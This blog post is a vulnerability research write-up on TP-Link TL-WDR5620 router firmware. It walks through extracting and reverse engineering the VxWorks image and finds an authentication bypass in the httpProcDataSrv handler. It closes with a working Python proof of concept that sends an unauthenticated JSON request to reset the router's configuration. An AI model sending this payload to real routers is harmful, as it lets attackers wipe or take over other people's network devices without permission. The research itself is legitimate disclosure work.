

[![](https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/Logo-NavBar@3x.png)](/)

* [博客](/ "博客")
* [分类](/categories/ "分类")
* [标签](/tags/ "标签")
* [归档](/archives/ "归档")
* [关于](/about/ "关于")

* + [博客](/ "博客")
  + [分类](/categories/ "分类")
  + [标签](/tags/ "标签")
  + [归档](/archives/ "归档")
  + [关于](/about/ "关于")

YUhehe的博客

学习笔记

[主页](/)
[标签](/tags/)

# TL-WDR5620 Gigabit Edition v2.3

[![](https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png)

请设置文章作者](/)

发布于：2024年9月4日

# Firmware analysis

Firmware download:[TL-WDR5620千兆版 V2.0升级软件20200302\_2.6.60-Tp-link无线路由器及网络设备-恩山无线论坛 (right.com.cn)](https://www.right.com.cn/forum/thread-4056594-1-1.html)

Advanced decompression and firmware extraction using binwalk

| ``` 123 ``` | ``` unzip TL-WDR5620千兆版 V2.0升级软件20200302_2.6.60.zipcd unzip TL-WDR5620千兆版 V2.0升级软件20200302_2.6.60binwalk -Me TL-WDR5620千兆版_V2.0_2.6.60_Build_200302_Rel.57804n.bin  ``` |
| --- | --- |

![](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814171855541.png)

![](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814180438306.png)

It was found that this firmware is based on the VxWorks system (a real-time operating system, RTOS). After decompression and analysis through binwalk, a complete file system similar to that of most other routers cannot be obtained.

As can be seen from the binwalk analysis results, the u-Boot program is located at the beginning of the file, followed by LZMA compressed data. To extract the u-Boot program, you need to determine its size or use a specific byte offset, which is 46560. According to this length, use the dd command to extract the uBoot program.

| ``` 1 ``` | ``` dd if=TL-WDR5620千兆版_V2.0_2.6.60_Build_200302_Rel.57804n.bin of=uboot.raw bs=1 skip=46560 count=1093216 ``` |
| --- | --- |

![](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814213059698.png)

You can confirm it with binwalk analysis.

![](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814213012063.png)

After extracting the uBoot program, we noticed that the size of the first piece of LZMA data immediately following the u-Boot program is the largest piece of all LZMA data. Generally speaking, this is the location of the main program. We use the same method to extract the main program. . Main program length = 1139776 - 62464 = 1,077,312

| ``` 1 ``` | ``` dd if=TL-WDR5620千兆版_V2.0_2.6.60_Build_200302_Rel.57804n.bin of=main.lzma bs=1 skip=62464 count=1077312 ``` |
| --- | --- |

![image-20240814214932691](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814214932691.png)

After getting the lzma compressed package file of the main program, decompress it through lzma (the main file is actually the F400 file extracted by the `binwalk -Me` command. We can also use it directly without extracting it)

| ``` 1 ``` | ``` lzma -d main.lzma ``` |
| --- | --- |

![image-20240814214946731](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814214946731.png)

After decompression, you get the main file. Use binwalk to perform decompression analysis. You can see that it is a VxWorks operating system, little endian.

| ``` 1 ``` | ``` binwalk main ``` |
| --- | --- |

![image-20240814215008759](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814215008759.png)

From the output of `binwalk -A main`, you can see that there are a large number of MIPSEL instruction sequences in the firmware file `main`. These are usually machine codes in Little Endian format under the MIPS architecture. MIPSEL is a variant of the MIPS architecture designed for little-endian mode.

![image-20240815150525905](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240815150525905.png)

When using disassembly tools such as ida or ghidra for analysis, you need to know the loading address of the VxWorks system, otherwise the system cannot be analyzed correctly. The loading address of the VxWorks system is the same as the stack initialization address. According to the official instructions given by VxWorks, it uses usrInit for stack initialization, and usrInit is the first function that runs after the VxWorks system boots, so the VxWorks system files can be directly thrown to ida , first use 0 as the loading address, and then find the location where the sp register first appears, which is the loading base address of the VxWorks system.

For this firmware, I used the following method: search for the string “MyFirmware” in the firmware, and then search upwards for the beginning of a segment. This is easy to identify. Generally, the beginning of a segment is filled with 0xFF or 0x00 before the previous segment. After finding the starting position of the segment, count 0x18 bytes back. These two four-byte values are the loading address of the VxWorks system. (Note: It is not universal. For detailed methods, see:[VxWorks固件加载地址分析方法研究 | Hexo (unrav31.github.io)](https://unrav31.github.io/2022/11/30/vxworks-gu-jian-jia-zai-di-zhi-fen-xi-fang-fa-yan-jiu/)）

![image-20240814220354355](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814220354355.png)

But after setting the loading address to 0x80001000, IDA still did not load any functions.

![image-20240831123136438](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240831123136438.png)

![image-20240815161356122](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240815161356122.png)

However, by pressing the “C” key at some addresses, functions can be automatically analyzed, but there are still very few functions identified.

![image-20240831123333117](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240831123333117.png)

Use the [firmware\_fix](https://github.com/zh-explorer/ida_script/blob/master/firmware_fix.py) plug-in to identify more functions, and fill in the load base address 0x80001000 (usually filled in, You just need to tick)

![image-20240816190249643](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240816190249643.png)

The effect is as follows

![image-20240831131521693](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240831131521693.png)

But both `Imports` and `Exports` are empty. It may be because the symbol table is not imported. However, through binwalk analysis and search for the flag string, it is found that neither the internal nor the external symbol table can be found. It can be judged that this is an unsigned table. firmware

![image-20240816194439233](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240816194439233.png)

I tried using some plug-ins to restore the function name

### [lscan](https://github.com/maroueneboubakri/lscan/blob/master/README.md) for identification

Not used successfully

### Use [Finger](https://github.com/aliyunav/Finger/blob/master/finger_plugin.py) for identification

| ``` 123 ``` | ``` pip install finger_sdk# Download addresshttps://github.com/aliyunav/Finger/blob/master/finger_plugin.py ``` |
| --- | --- |

Put finger\_plugin.py into plugins

It took me a long time to identify this, but no one was identified.

### lumina for identification

![image-20240818192121482](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240818192121482.png)

Recognition failed

### Use [Rizzo](https://github.com/Reverier-Xu/Rizzo-IDA/blob/main/rizzo.py) for identification

I tried several firmwares, but none of them matched.

![image-20240817213938880](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240817213938880.png)

![image-20240818152713573](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240818152713573.png)

![image-20240818163054188](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240818163054188.png)

![image-20240819152118810](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240819152118810.png)

![image-20240819171616197](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240819171616197.png)

There is no other way but to manually review the code and analyze it.

I searched for information on the Internet and found this article: [VxWorks固件系统研究 | CTF导航 (ctfiot.com)](https://www.ctfiot.com/84459.html)It seems that the research is also TL-WDR5620, according to this article You can know the following four functions:

printf:

![image-20240831124128016](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240831124128016.png)
![image-20240821164814915](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240821164814915.png)

vprintf:

![image-20240821164856003](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240821164856003.png)

strcapy:

![image-20240821163541160](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240821163541160.png)
![image-20240821164728306](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240821164728306.png)

strncapy:

![image-20240821164054065](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240821164054065.png)
![image-20240821164525538](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240821164525538.png)

Then I restored the function name of this main file with reference to the function names of the firmware “TL-WDR7660 2.0.30” and “TL-WDR5620 V3.0\_171128 Standard Edition”. First, I based on the error information returned by sending the error packet: “ error\_code “

![380681f1217fdb162d72ad98d07a33b](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/380681f1217fdb162d72ad98d07a33b.png)

Search for the string “error\_code” in the main program files of these three firmwares, compare them one by one, and guess to repair the function name of the main file pair of TL-WDR5620v2.0

![image-20240831141542665](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240831141542665.png)

After the functions related to “error\_code” are fixed, it can be found that there is a vulnerability in the `httpProcDataSrv` function.

The function starts by parsing a JSON object from some data source (perhaps the request body). If parsing fails or the `method` field is not `"do"`, the function will jump to label LABEL\_70, perform some cleanup operations and exit.

If `method` is `"do"`, the function next attempts to match the session. If no valid session is found, it will jump to LABEL\_18, set the HTTP status code to 401 (unauthorized), and exit.

If a valid session exists, the function checks the JSON object for the presence of the “login” field and attempts to obtain the password. If the password verification fails or does not meet the requirements, it will jump to LABEL\_26, set the HTTP status code to 401, and exit.

The code checks the number of unauthorized attempts and locks the client if the limit is exceeded.

If the JSON object contains the field `"cfgsync"` and the value of the `"get_config_info"` field is `null`, the function will call the `sub_8030BAFC` function, which may bypass the user authorization check.

The problem is that if the JSON data we send contains `"method":"do"` and `"cfgsync":{"get_config_info":null}`, they may be able to bypass the `httpDoAuthorize` function (which is supposed to be responsible for user authorization ) call.

![image-20240822233918371](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240822233918371.png)

## Exploit

Product: TL-WDR5620 Gigabit version v2.3

![image-20240831170432084](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240831170432084.png)

![image-20240814164850248](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814164850248.png)

The initial login interface requires a password.

![image-20240814164955372](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814164955372.png)

Run the poc

![image-20240814165101529](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814165101529.png)

You can see that the wifi name has been reset

![image-20240814165133844](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814165133844.png)

The password has also been reset

![image-20240814165200713](/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/image-20240814165200713.png)

[poc.py](https://github.com/fishykz/TP-POC)

| ``` 1234567891011 ``` | ``` import sysimport requestsif len(sys.argv) != 2:    exit()ip = sys.argv[1]s = requests.Session()data = "{\"system\":{\"reset\":null},\"method\":\"do\", \"cfgsync\":{\"get_config_info\":null}}"response = s.post("http://%s/ds" %ip, data=data)print("Status code:   %i" % response.status_code)print("Response body: %s" % response.content) ``` |
| --- | --- |

## Reference documentation

[揭秘VxWorks路由器破解之路\_哔哩哔哩\_bilibili](https://www.bilibili.com/video/BV1D3411b7XY/?spm_id_from=333.788.recommend_more_video.-1&vd_source=0f29a1b0ae5e0659a916e72df6cece46)

[VxWorks固件加载地址分析方法研究 | Hexo (unrav31.github.io)](https://unrav31.github.io/2022/11/30/vxworks-gu-jian-jia-zai-di-zhi-fen-xi-fang-fa-yan-jiu/)

[TL-WDR7660 httpProcDataSrv任意代码执行漏洞复现分析\_tl-fw防火墙漏洞复现-CSDN博客](https://blog.csdn.net/meichuangkeji/article/details/129884354)

[二进制静态分析—库函数识别\_ida lumina-CSDN博客](https://blog.csdn.net/abel_big_xu/article/details/124388798)

[VxWorks固件系统研究 | CTF导航 (ctfiot.com)](https://www.ctfiot.com/84459.html)

[fishykz/TP-POC (github.com)](https://github.com/fishykz/TP-POC)

更新于：2024年9月6日

[IOT, TL-WDR5620](/tags/IOT-TL-WDR5620/)
IOT, TL-WDR5620
[![](https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png)](http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/&title=TL-WDR5620 Gigabit Edition v2.3 - YUhehe的博客&summary=)
[![](https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png)](https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/&title=TL-WDR5620 Gigabit Edition v2.3 - YUhehe的博客&summary=)
[![](https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png)](http://service.weibo.com/share/share.php?url=http://example.com/2024/09/04/TL-WDR5620-Gigabit-Edition-v2-3/&title=TL-WDR5620 Gigabit Edition v2.3 - YUhehe的博客&summary=)

[RC4解密

RC4简介RC4加密算法 - shelmean - 博客园 (cnblogs.com)
RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，...](/2024/09/04/RC4%E8%A7%A3%E5%AF%86/)

 评论

本文目录

1. [lscan for identification](#lscan-for-identification)
2. [Use Finger for identification](#Use-Finger-for-identification)
3. [lumina for identification](#lumina-for-identification)
4. [Use Rizzo for identification](#Use-Rizzo-for-identification)

- [Exploit](#Exploit)
- [Reference documentation](#Reference-documentation)

博客内容遵循 [署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)

本站使用
[Volantis](https://github.com/volantis-x/hexo-theme-volantis/#5.8.0)
作为主题

[Copyright © 2017-2021 XXX](/)

